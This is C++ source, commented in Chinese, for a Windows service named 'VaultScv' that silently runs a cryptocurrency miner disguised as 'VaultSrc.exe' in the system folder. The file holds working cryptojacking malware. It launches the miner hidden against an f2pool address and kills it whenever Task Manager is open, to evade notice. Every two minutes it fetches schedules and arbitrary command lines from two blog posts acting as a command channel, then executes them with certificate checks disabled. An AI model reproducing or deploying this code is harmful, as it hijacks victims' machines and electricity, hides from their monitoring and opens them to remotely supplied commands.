/*
主服务，负责拉起矿机
*/
#pragma once
#pragma warning(disable:4996)
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <tchar.h>
#include <winsvc.h>
#include <stdlib.h>
#include <curl\curl.h>
#include <time.h>
#include <fstream>

using namespace std;
#pragma comment  (lib,"User32.lib")
#pragma comment  (lib,"Gdi32.lib")

static std::string static_cmd_line;
static unsigned static_working_time[24] = { 1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 };
static bool parameters_get_success = false;//参数更新成功
static bool parameters_bak_get_success = false;//备份参数更新成功

const std::string kill_miner_cmd = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";//杀程序命令
static std::string id = "asdfghjkl999";//默认的本机id，也能用，但是不好管理，读取配置文件成功则更新
const std::string order_url = "https://blog.csdn.net/m0_48585347/article/details/117000137";
const std::string order_url_bak = "https://blog.csdn.net/huqinweI987/article/details/116894555";//垃圾CSDN通过的文章也随时有审核不通过下架的风险，考虑做一个备份，当然了，都不访问也有一个固定时间去运转


//typedef enum __bool { false = 0, true = 1, } bool;
//定义一些全局变量和函数
void ServiceMain(DWORD argc, LPTSTR *argv);
void ServiceCtrlHandler(DWORD dwControlCode);
//SCM报告服务状态信息
BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode,
    DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint,
    DWORD dwWaitHint);
BOOL InitThread(); //创建线程来运行我们的任务
DWORD sysnap(LPDWORD param); //我们这个服务所要完成的任务
HANDLE hServiceThread;
void KillService();
char *strServiceName = "VaultScv"; //标识服务的内部名
//LPWSTR strServiceName = "VaultScv"; //标识服务的内部名
SERVICE_STATUS_HANDLE nServiceStatusHandle; //存储调用RegisterServiceCtrlHandler返回的句柄
HANDLE killServiceEvent;
BOOL nServiceRunning;
DWORD nServiceCurrentStatus;
FILE * Fces = NULL;

void kill_miner();
bool is_running(std::string  process_name = "taskmgr.exe");
void ServiceMain(DWORD argc, LPTSTR *argv);
bool is_weekend_determind();


void main(int argc, char *argv[])
{
    WCHAR wszClassName2[256];
    MultiByteToWideChar(CP_ACP, 0, strServiceName, strlen(strServiceName) + 1, wszClassName2,
        sizeof(wszClassName2) / sizeof(wszClassName2[0]));

    SERVICE_TABLE_ENTRY servicetable[] = { { wszClassName2,(LPSERVICE_MAIN_FUNCTION)ServiceMain },{ NULL,NULL } };
    BOOL success;
    // StartServiceCtrlDispatcher 函数负责把程序主线程连接到服务控制管理程序
    success = StartServiceCtrlDispatcher(servicetable);
    if (!success)
    {
        printf("failed!");
    }
}


std::string TCHAR2STRING(TCHAR *STR)
{
    int iLen = WideCharToMultiByte(CP_ACP, 0, STR, -1, NULL, 0, NULL, NULL);   //首先计算TCHAR 长度。
    char* chRtn = new char[iLen * sizeof(char)];  //定义一个 TCHAR 长度大小的 CHAR 类型。
    WideCharToMultiByte(CP_ACP, 0, STR, -1, chRtn, iLen, NULL, NULL);  //将TCHAR 类型的数据转换为 CHAR 类型。
    std::string str(chRtn); //最后将CHAR 类型数据 转换为 STRING 类型数据。
    return str;
}

bool PrintProcessNameAndID(DWORD processID,std::string  process_name = "taskmgr.exe")
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);
    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    if (TCHAR2STRING(szProcessName) == process_name)
    {
        return true;
    }

    

    CloseHandle(hProcess);
    return false;
}

bool is_running(std::string  process_name) {

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return false;//bug？按false算
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            bool is_found = PrintProcessNameAndID(aProcesses[i], process_name = process_name);
            if (is_found)
                return true;
        }
    }
    return false;
}

static size_t update_parameters(void *buffer, size_t sz, size_t nmemb, void *writer)
{
    string* psResponse = (string*)writer;
    size_t size = sz * nmemb;
    psResponse->append((char*)buffer, size);

    int index = psResponse->find(id);
    if (index == -1) {
        parameters_get_success = false;
        return sz * nmemb;
    }
    std::string comparision = "[";
    if ((psResponse->at(index + 12)) == '[')
    {
        for (int i = 0; i < 24; i++) {
            char flag = psResponse->at(index + 12 + 1 + i);
            if (flag == ']')//异常终止
                break;
            static_working_time[i] = flag == '1' ? 1 : 0;
        }
    }
    int start_index = index + 12 + 1 + 24 + 1 + 1;//start选取的是[后边
    int word_cnt = psResponse->substr(start_index).find_first_of("]");//这个是]的相对位置，需要加上起点
                                                                      //end_index = start_index + end_index;//加偏移量
    std::string cmd_line = psResponse->substr(start_index, word_cnt);
    int at_index = cmd_line.find_first_of("*");//用*代替@，网页解析问题，再替换回来.TODO:改进版：万一*会出现冲突，自己设计独特的识别符
    if (at_index == -1) {
        parameters_get_success = false;
        return sz * nmemb;
    }

    std::string cmd_line_sub1 = cmd_line.substr(0, at_index);
    std::string cmd_line_sub2 = cmd_line.substr(at_index + 1, cmd_line.size());

    cmd_line = cmd_line_sub1 + "@" + cmd_line_sub2;//替换，组合
    static_cmd_line = cmd_line;
    parameters_get_success = true;
    return sz * nmemb;
}

void update_cmd() {
    //获取命令
    string strTmpStr;
    //string str_error_buffer;
    char errbuf[CURL_ERROR_SIZE];
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, order_url.c_str());
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, update_parameters);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &strTmpStr);

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);//忽略证书检查
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);

    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    /*
    *debug用
    string strRsp;
    if (res != CURLE_OK)
    {
        strRsp = "error";
        FILE *fp = NULL;
        fp = fopen("C:/Windows/SysWOW64/test120.txt", "a+");//打印日志
        fprintf(fp, "CURLE_OK no!!!code is %d!!!\n\n", res);
        fprintf(fp, errbuf);
        fclose(fp);
    }
    else
    {
        strRsp = strTmpStr;
    }
    */
}

static size_t update_parameters_bak(void *buffer, size_t sz, size_t nmemb, void *writer)
{
    string* psResponse = (string*)writer;
    size_t size = sz * nmemb;
    psResponse->append((char*)buffer, size);

    int index = psResponse->find(id);
    if (index == -1) {
        parameters_bak_get_success = false;
        return sz * nmemb;
    }
    std::string comparision = "[";
    if ((psResponse->at(index + 12)) == '[')
    {
        for (int i = 0; i < 24; i++) {
            char flag = psResponse->at(index + 12 + 1 + i);
            if (flag == ']')//异常终止
                break;
            static_working_time[i] = flag == '1' ? 1 : 0;
        }
    }
    int start_index = index + 12 + 1 + 24 + 1 + 1;//start选取的是[后边
    int word_cnt = psResponse->substr(start_index).find_first_of("]");//这个是]的相对位置，需要加上起点
                                                                      //end_index = start_index + end_index;//加偏移量
    std::string cmd_line = psResponse->substr(start_index, word_cnt);
    int at_index = cmd_line.find_first_of("*");//用*代替@，网页解析问题，再替换回来.TODO:改进版：万一*会出现冲突，自己设计独特的识别符
    if (at_index == -1) {
        parameters_bak_get_success = false;
        return sz * nmemb;
    }

    std::string cmd_line_sub1 = cmd_line.substr(0, at_index);
    std::string cmd_line_sub2 = cmd_line.substr(at_index + 1, cmd_line.size());

    //C:/Windows/SysWOW64/VaultSrc.exe 中，详细路径可以不放在明指令中，不过两处获取指令的拼接字符串处都要修改，为了避免前后版本不兼容，先缓一缓，不增加复杂性
    //todo：还要看一下如果命令过长出现换行，在博客会不会出错，不自己主动回车就不会错

    cmd_line = cmd_line_sub1 + "@" + cmd_line_sub2;//替换，组合
    static_cmd_line = cmd_line;
    parameters_bak_get_success = true;
    return sz * nmemb;
}
void update_cmd_bak() {
    //获取命令
    string strTmpStr;
    //string str_error_buffer;
    char errbuf[CURL_ERROR_SIZE];
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, order_url_bak.c_str());
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, update_parameters_bak);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &strTmpStr);

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);//忽略证书检查
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);

    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}

DWORD sysnap(LPDWORD param)//main loop
{
    //Sleep(22000);//debug用，等待附加进程
    bool is_taskmgr_running;//必须在这声明？while内有问题？不应该，直接用返回值也出现了问题，todo：都删了，之前是其他问题
    bool is_miner_running;//todo：都删了，之前是其他问题
    system(kill_miner_cmd.c_str());

    //读取id
    std::ifstream in("C:/Windows/SysWOW64/vcfg");
    if (in) {
        getline(in, id);
        in.close();
    }
    std::string command = "C:\\Windows\\SysWOW64\\VaultSrc.exe  -uri ethstratum://glk300."+id+"@eth.f2pool.com:6688";// cmd;
    update_cmd();
    if (parameters_get_success)
        command = static_cmd_line;
    else {
        update_cmd_bak();
        if (parameters_bak_get_success)
            command = static_cmd_line;
    }


    while (nServiceRunning)
    {
        is_taskmgr_running = is_running("taskmgr.exe") || is_running("Taskmgr.exe");//todo：都删了，之前是其他问题
        if (is_taskmgr_running) {//如果有任务管理器，则不运行
            system(kill_miner_cmd.c_str());
            Sleep(5000);
            continue;
        }

        time_t tt = time(NULL);
        tm* t = localtime(&tt);

        if (t->tm_min%2 == 0 && t->tm_sec < 3) {//2分钟拉一次指令，
            update_cmd();
            if (parameters_get_success)
                command = static_cmd_line;//kill_miner();频繁更新时到底要不要重启矿机？更新分两部分，一个是运行，一个是命令，命令也可以通过远程重启（置零）解决
            else {
                update_cmd_bak();
                if (parameters_bak_get_success)
                    command = static_cmd_line;
            }
        }

        is_miner_running = is_running("VaultSrc.exe");//todo：都删了，之前是其他问题
        if (1) {//新版本逻辑
            if (static_working_time[t->tm_hour] == 1) {//运行
                if (!is_miner_running)
                {

                    WinExec(command.c_str(), SW_HIDE);
                }
            }
            else
            {
                system(kill_miner_cmd.c_str());
                //kill_miner();
            }

        }
        else {//可能不再用的旧逻辑，暂时保留，即使更新失败，我也可以简单写死一个数组，逻辑更清晰，虽然损失了周末
            bool is_weekend = is_weekend_determind();
            if (is_weekend) {//优先判断周末，周末全天
                if (!is_miner_running)
                {
                    WinExec(command.c_str(), SW_HIDE);
                }
            }
            else if (t->tm_hour >= 21 || t->tm_hour < 10) {//平日开机时间
                if (!is_miner_running)
                {
                    WinExec(command.c_str(), SW_HIDE);
                }
            }
            else {//平日停机
                std::string temp = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";
                system(temp.c_str());
                //kill_miner();
            }
        }
        Sleep(1000);
    }
    return 0;
}


#include "service.h"

void ServiceMain(DWORD argc, LPTSTR *argv)
{
    //Sleep(20 * 1000);
    WCHAR wszClassName2[256];
    MultiByteToWideChar(CP_ACP, 0, strServiceName, strlen(strServiceName) + 1, wszClassName2,
        sizeof(wszClassName2) / sizeof(wszClassName2[0]));

    BOOL success;
    //把ServiceCtrlHandler注册为服务控制器,接受来自SCM的请求并做出处理,
    nServiceStatusHandle = RegisterServiceCtrlHandler(wszClassName2, (LPHANDLER_FUNCTION)ServiceCtrlHandler);
    //判断是否注册成功,否则返回
    if (!nServiceStatusHandle) { return; }
    //注册成功后向SCM报告服务状态信息,因为服务还没初始化完成,所以当前服务状态为SERVICE_START_PENDING
    success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 1, 3000);
    if (!success) { return; }
    //创建一个事件,在函数的最后将用该事件来保持函数的运行直到SCM发出停止请求才返回
    killServiceEvent = CreateEvent(0, TRUE, FALSE, 0);
    if (killServiceEvent == NULL) { return; }
    //向SCM报告服务状态信息
    success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 2, 1000);
    if (!success) { return; }
    //我们的服务开始运行任务了,当前状态设置为SERVICE_RUNNING
    nServiceCurrentStatus = SERVICE_RUNNING;
    success = ReportStatusToSCMgr(SERVICE_RUNNING, NO_ERROR, 0, 0, 0);
    if (!success) { return; }
    //InitThread()创建一个线程来运行我们的sysnap()函数
    success = InitThread();
    if (!success) { return; }
    //sysnap()函数运行完了之后返回ServiceMain(),ServiceMain()调用WaitForSingleObject,因为服务被停止之前ServiceMain()不会结束
    WaitForSingleObject(killServiceEvent, INFINITE);
    CloseHandle(killServiceEvent);
}




//向SCM报告服务状态信息,可以说是更新信息吧,它接受的参数都是SERVICE_STATUS结构成员
BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint, DWORD dwWaitHint)
{
    BOOL success;
    SERVICE_STATUS nServiceStatus; //定义一个SERVICE_STATUS类型结构nServiceStatus
    nServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; //表示我们的服务是独占一个进程的服务
    nServiceStatus.dwCurrentState = dwCurrentState; //当前服务状态
    if (dwCurrentState == SERVICE_START_PENDING)
    {
        nServiceStatus.dwControlsAccepted = 0; //服务的初始化没有完成
    }
    else
    {
        nServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; //通知 SCM 服务接受哪个域。这里允许 STOP 和SHUTDOWN 请求
    }
    //dwServiceSpecificExitCode在你终止服务并报告退出细节时很有用。初始化服务时并不退出，因此值为 0
    if (dwServiceSpecificExitCode == 0)
    {
        nServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    }
    else
    {
        nServiceStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
    }
    nServiceStatus.dwServiceSpecificExitCode = dwServiceSpecificExitCode;
    nServiceStatus.dwCheckPoint = dwCheckPoint;
    nServiceStatus.dwWaitHint = dwWaitHint;
    //设置好nServiceStatus后,向SCM报告服务状态
    success = SetServiceStatus(nServiceStatusHandle, &nServiceStatus);
    if (!success)
    {
        KillService();
        return success;
    }
    else
        return success;
}



BOOL InitThread()
{
    DWORD id;
    hServiceThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sysnap, 0, 0, &id);
    if (hServiceThread == 0)
    {
        return false;
    }
    else
    {
        nServiceRunning = true;
        return true;
    }
}



void KillService()
{
    nServiceRunning = false;
    /*kill_miner();*/
    std::string temp = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";
    system(temp.c_str());
    ReportStatusToSCMgr(SERVICE_STOPPED, NO_ERROR, 0, 0, 0);
}


void ServiceCtrlHandler(DWORD dwControlCode)
{
    BOOL success;
    switch (dwControlCode)
    {
    case SERVICE_CONTROL_SHUTDOWN:
        break;
    case SERVICE_CONTROL_STOP:
        nServiceCurrentStatus = SERVICE_STOP_PENDING;
        success = ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 0, 1, 3000);//先更新服务状态为SERVICDE_STOP_PENDING,再停止服务
        KillService();
        return;
    default:
        break;
    }
    ReportStatusToSCMgr(nServiceCurrentStatus, NO_ERROR, 0, 0, 0);
}




bool is_weekend_determind() {//废弃了，改用参数拉取
    bool is_weekend = false;
    time_t tt = time(NULL);
    tm* t = localtime(&tt);
    int month = t->tm_mon + 1;
    int year = t->tm_year + 1900;
    if (t->tm_wday == 6 || t->tm_wday == 0)//weekend
    {
        if (
            (year == 2021 && month == 5 && t->tm_mday == 8) ||
            (year == 2021 && month == 9 && t->tm_mday == 18) ||
            (year == 2021 && month == 9 && t->tm_mday == 26) ||
            (year == 2021 && month == 10 && t->tm_mday == 9)
            )
        {//exception
            is_weekend = false;
        }
        else
            is_weekend = true;
    }
    else
    {
        if (//holiday
            (year == 2021 && month == 5 && t->tm_mday == 1) ||
            (year == 2021 && month == 5 && t->tm_mday == 2) ||
            (year == 2021 && month == 5 && t->tm_mday == 3) ||
            (year == 2021 && month == 5 && t->tm_mday == 4) ||
            (year == 2021 && month == 5 && t->tm_mday == 5) ||

            (year == 2021 && month == 6 && t->tm_mday == 12) ||
            (year == 2021 && month == 6 && t->tm_mday == 13) ||
            (year == 2021 && month == 6 && t->tm_mday == 14) ||

            (year == 2021 && month == 9 && t->tm_mday == 19) ||
            (year == 2021 && month == 9 && t->tm_mday == 20) ||
            (year == 2021 && month == 9 && t->tm_mday == 21) ||

            (month == 10 && t->tm_mday == 1) ||
            (month == 10 && t->tm_mday == 2) ||
            (month == 10 && t->tm_mday == 3) ||
            (month == 10 && t->tm_mday == 4) ||
            (month == 10 && t->tm_mday == 5) ||
            (month == 10 && t->tm_mday == 6) ||
            (month == 10 && t->tm_mday == 7)
            )
        {
            is_weekend = true;
        }
        else
            is_weekend = false;
    }

    return is_weekend;

}


//                FILE *fp = NULL;
//                fp = fopen("C:/Windows/SysWOW64/test111.txt", "a+");//打印日志
//                fputs(command.c_str(), fp);